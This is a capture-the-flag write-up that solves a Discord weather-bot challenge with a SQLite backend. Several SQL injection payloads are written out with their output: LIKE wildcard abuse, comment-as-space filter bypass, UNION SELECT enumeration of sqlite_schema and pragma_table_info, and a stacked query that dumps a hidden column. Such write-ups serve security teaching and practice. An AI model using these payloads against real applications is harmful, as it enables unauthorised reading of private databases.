# Meteo discord bot

## Context

The challenge provided the username of a discord bot. This discord bot can be used to give the meteo in private messages.

This bot has 3 commands : 

 - !help -> Gives available commands
 - !liste -> Returns the available towns
 - !meteo -> Gives the meteo of an available town

The only function that appears to need a user input is !meteo.

If we try to do
```
!meteo Madrid
```
The bot returns
```
| id | capital | temperature |
+----+---------+-------------+
| 19 |  Madrid |      14     |
+----+---------+-------------+
```

The structure of the answer seems like one created with a SQL querry.

## First exploit

After looking into the meteo command thats how it works

```
if payload length <= 3
=> return HAHAHAHA, N'essaye pas de contourner mes sécurités. Tu dois rentrer un nom de capital que je connais !

if in capital list
=> return capital information

if not a capital
=> returns nothing
```

What's also interesting, is that our argument isn't case sensitive. Which means that "madrid" and "MaDRiD" are interpreted the same.

This can mean 2 things, or the argument is transformed in lowercase/uppercase or the querry uses a LIKE instruction.

If the querry uses a LIKE, it means that we can use % inside (here we need to use more than 3 because otherwise it doesn't process the querry).

```
!meteo %%%%

| id |       capital        |  temperature  |
+----+----------------------+---------------+
| 0  |      Amsterdam       |       2       |
| 1  |       Athènes        |       16      |
| 2  |       Belgrade       |       5       |
| 3  |        Berlin        |       0       |
| 4  |        Berne         |       16      |
| 5  |      Bratislava      |       12      |
| 6  |      Bruxelles       |       8       |
| 7  |       Bucarest       |       1       |
| 8  |       Budapest       |       3       |
| 9  |       Chisinau       |       11      |
| 10 |      Copenhague      |       25      |
| 11 |        Dublin        |       28      |
| 12 |       Helsinki       |       23      |
| 13 |         Kiev         |       18      |
| 14 |       Valette        |       23      |
| 15 |       Lisbonne       |       20      |
| 16 |      Ljubljana       |       25      |
| 17 |       Londres        |       24      |
| 18 |      Luxembourg      |       28      |
| 19 |        Madrid        |       14      |
| 44 | 109pUjkEezHhFGrCpHIg | MCTF{11K3_0r_ |
+----+----------------------+---------------+
```

And here we have the first part of the flag MCTF{11K3_0r_

## Second exploit

Apparently we didn't found all the secrets of the bot.

The only remaining possibility I see is a SQL injection in the paramter of !meteo

But payload like ' or 1=1 -- - didn't work.

So, I decided to replace all spaces with `/**/` cause discord bots uses spaces to differenciate the parameters.

But that didn't work either.

That's when I thought of something, what if there was a ). So I tried


```
!meteo ')/**/or/**/1=1/*

| id |       capital        |  temperature  |
+----+----------------------+---------------+
| 0  |      Amsterdam       |       2       |
| 1  |       Athènes        |       16      |
| 2  |       Belgrade       |       5       |
| 3  |        Berlin        |       0       |
| 4  |        Berne         |       16      |
| 5  |      Bratislava      |       12      |
| 6  |      Bruxelles       |       8       |
| 7  |       Bucarest       |       1       |
| 8  |       Budapest       |       3       |
| 9  |       Chisinau       |       11      |
| 10 |      Copenhague      |       25      |
| 11 |        Dublin        |       28      |
| 12 |       Helsinki       |       23      |
| 13 |         Kiev         |       18      |
| 14 |       Valette        |       23      |
| 15 |       Lisbonne       |       20      |
| 16 |      Ljubljana       |       25      |
| 17 |       Londres        |       24      |
| 18 |      Luxembourg      |       28      |
| 19 |        Madrid        |       14      |
| 44 | 109pUjkEezHhFGrCpHIg | MCTF{11K3_0r_ |
+----+----------------------+---------------+
```

And it worked ... So now I knew that I was only missing a ). Time for the exploitation.

Fisrtly, lets list all the available tables.

```
!meteo '/**/or/**/1=1)/**/union/**/select/**/name,2,3/**/FROM/**/sqlite_schema/**/WHERE/**/type='table'/*

|   id  |       capital        |  temperature  |
+-------+----------------------+---------------+
|   0   |      Amsterdam       |       2       |
|   1   |       Athènes        |       16      |
|   2   |       Belgrade       |       5       |
|   3   |        Berlin        |       0       |
|   4   |        Berne         |       16      |
|   5   |      Bratislava      |       12      |
|   6   |      Bruxelles       |       8       |
|   7   |       Bucarest       |       1       |
|   8   |       Budapest       |       3       |
|   9   |       Chisinau       |       11      |
|   10  |      Copenhague      |       25      |
|   11  |        Dublin        |       28      |
|   12  |       Helsinki       |       23      |
|   13  |         Kiev         |       18      |
|   14  |       Valette        |       23      |
|   15  |       Lisbonne       |       20      |
|   16  |      Ljubljana       |       25      |
|   17  |       Londres        |       24      |
|   18  |      Luxembourg      |       28      |
|   19  |        Madrid        |       14      |
|   44  | 109pUjkEezHhFGrCpHIg | MCTF{11K3_0r_ |
| meteo |          2           |       3       |
+-------+----------------------+---------------+
```


Now that we have the table name `meteo`, we need the columns.


```
!meteo '/**/or/**/1=1)/**/union/**/select/**/group_concat(name,'|'),2,3/**/from/**/pragma_table_info("meteo")/*

|              id              |       capital        |  temperature  |
+------------------------------+----------------------+---------------+
|              0               |      Amsterdam       |       2       |
|              1               |       Athènes        |       16      |
|              2               |       Belgrade       |       5       |
|              3               |        Berlin        |       0       |
|              4               |        Berne         |       16      |
|              5               |      Bratislava      |       12      |
|              6               |      Bruxelles       |       8       |
|              7               |       Bucarest       |       1       |
|              8               |       Budapest       |       3       |
|              9               |       Chisinau       |       11      |
|              10              |      Copenhague      |       25      |
|              11              |        Dublin        |       28      |
|              12              |       Helsinki       |       23      |
|              13              |         Kiev         |       18      |
|              14              |       Valette        |       23      |
|              15              |       Lisbonne       |       20      |
|              16              |      Ljubljana       |       25      |
|              17              |       Londres        |       24      |
|              18              |      Luxembourg      |       28      |
|              19              |        Madrid        |       14      |
|              44              | 109pUjkEezHhFGrCpHIg | MCTF{11K3_0r_ |
| id|capital|temperature|temps |          2           |       3       |
+------------------------------+----------------------+---------------+
```

We can see that there is another column that we don't see normaly called `temps`.

Lets see whats in.

```
!meteo '/**/or/**/1=1)/**/union/**/select/**/temps,2,3/**/from/**/meteo/*

|     id     |       capital        |  temperature  |
+------------+----------------------+---------------+
|     0      |      Amsterdam       |       2       |
|     1      |       Athènes        |       16      |
|     2      |       Belgrade       |       5       |
|     3      |        Berlin        |       0       |
|     4      |        Berne         |       16      |
|     5      |      Bratislava      |       12      |
|     6      |      Bruxelles       |       8       |
|     7      |       Bucarest       |       1       |
|     8      |       Budapest       |       3       |
|     9      |       Chisinau       |       11      |
|     10     |      Copenhague      |       25      |
|     11     |        Dublin        |       28      |
|     12     |       Helsinki       |       23      |
|     13     |         Kiev         |       18      |
|     14     |       Valette        |       23      |
|     15     |       Lisbonne       |       20      |
|     16     |      Ljubljana       |       25      |
|     17     |       Londres        |       24      |
|     18     |      Luxembourg      |       28      |
|     19     |        Madrid        |       14      |
|     44     | 109pUjkEezHhFGrCpHIg | MCTF{11K3_0r_ |
| Ensoleillé |          2           |       3       |
| N07_11K3}  |          2           |       3       |
|  Nuageux   |          2           |       3       |
|  Orageux   |          2           |       3       |
|  Pluvieux  |          2           |       3       |
+------------+----------------------+---------------+
```

And here we have the rest of the flag `N07_11K3}`.

Whats funny about blind injection is that challengers are often really inventive. In fact, this payload was enough

```
!meteo madrid'); SELECT * from meteo --

| id |       capital        |  temperature  |   temps    |
+----+----------------------+---------------+------------+
| 19 |        Madrid        |       14      |            |
| 0  |      Amsterdam       |       2       |  Nuageux   |
| 1  |       Athènes        |       16      | Ensoleillé |
| 2  |       Belgrade       |       5       |  Pluvieux  |
| 3  |        Berlin        |       0       |  Orageux   |
| 4  |        Berne         |       16      |  Nuageux   |
| 5  |      Bratislava      |       12      | Ensoleillé |
| 6  |      Bruxelles       |       8       |  Pluvieux  |
| 7  |       Bucarest       |       1       |  Orageux   |
| 8  |       Budapest       |       3       |  Nuageux   |
| 9  |       Chisinau       |       11      | Ensoleillé |
| 10 |      Copenhague      |       25      |  Pluvieux  |
| 11 |        Dublin        |       28      |  Orageux   |
| 12 |       Helsinki       |       23      |  Nuageux   |
| 13 |         Kiev         |       18      | Ensoleillé |
| 14 |       Valette        |       23      |  Pluvieux  |
| 15 |       Lisbonne       |       20      |  Orageux   |
| 16 |      Ljubljana       |       25      |  Nuageux   |
| 17 |       Londres        |       24      | Ensoleillé |
| 18 |      Luxembourg      |       28      |  Pluvieux  |
| 19 |        Madrid        |       14      |  Orageux   |
| 44 | 109pUjkEezHhFGrCpHIg | MCTF{11K3_0r_ | N07_11K3}  |
+----+----------------------+---------------+------------+
```

Thanks for the challenge.